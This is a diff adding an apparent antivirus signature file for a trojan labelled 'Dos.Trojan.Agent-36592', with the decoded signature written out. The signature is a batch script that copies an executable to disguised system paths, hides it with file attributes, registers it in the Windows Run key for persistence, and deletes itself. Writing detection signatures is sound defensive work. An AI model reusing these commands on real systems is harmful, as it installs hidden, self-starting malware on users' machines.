@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36592
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off color 0a copy 2.exe c:\spolsv.exe >nul copy 2.exe d:\9.exe >nul attrib +r +s +h c:\spolsv.exe >nul @reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v nvscvs32s /t reg_sz /d c:\spolsv.exe /f del %0 
